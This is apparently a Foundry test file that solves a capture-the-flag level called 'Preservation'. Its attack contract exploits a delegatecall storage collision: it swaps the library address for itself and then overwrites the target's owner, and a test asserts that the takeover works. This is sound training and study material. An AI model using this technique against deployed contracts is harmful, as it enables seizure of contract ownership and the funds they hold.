// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Preservation.sol";
import {Test} from "forge-std/Test.sol";

contract PreservationAttack {
    // must match Preservation storage layout
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    Preservation public preservation;

    constructor(address _preservation) {
        preservation = Preservation(_preservation);
    }

    function attack(address _attacker) external {
        // Step 1: overwrite timeZone1Library with this contract
        preservation.setFirstTime(uint256(uint160(address(this))));
        // Step 2: delegatecall into our setTime -> overwrite owner
        preservation.setFirstTime(uint256(uint160(_attacker)));
    }

    function setTime(uint256 _attacker) public {
        owner = address(uint160(_attacker));
    }
}

contract PreservationAttackTest is Test {
    Preservation public preservation;
    LibraryContract public lib1;
    LibraryContract public lib2;
    PreservationAttack public attacker;

    address public player = address(0xBEEF);

    function setUp() public {
        lib1 = new LibraryContract();
        lib2 = new LibraryContract();
        preservation = new Preservation(address(lib1), address(lib2));
        attacker = new PreservationAttack(address(preservation));
    }

    function testAttack() public {
        attacker.attack(player);

        assertEq(preservation.owner(), player);
    }
}
